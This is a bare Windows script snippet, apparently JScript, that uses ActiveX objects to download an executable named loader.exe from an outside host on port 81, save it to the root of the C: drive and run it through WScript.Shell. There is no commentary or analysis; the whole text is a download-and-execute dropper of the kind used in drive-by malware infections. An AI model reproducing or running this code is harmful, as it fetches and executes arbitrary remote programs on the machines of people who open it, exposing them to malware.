var x = new ActiveXObject("Microsoft.XMLHTTP"); 
x.Open("GET", "http://www.db105.com:81/o/u/i/loader.exe",0); 
x.Send(); 

var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);

s.SaveToFile("C:\\loader.exe",2);
var shell = CreateObject("WScript.Shell");
shell.Run("C:\\loader.exe");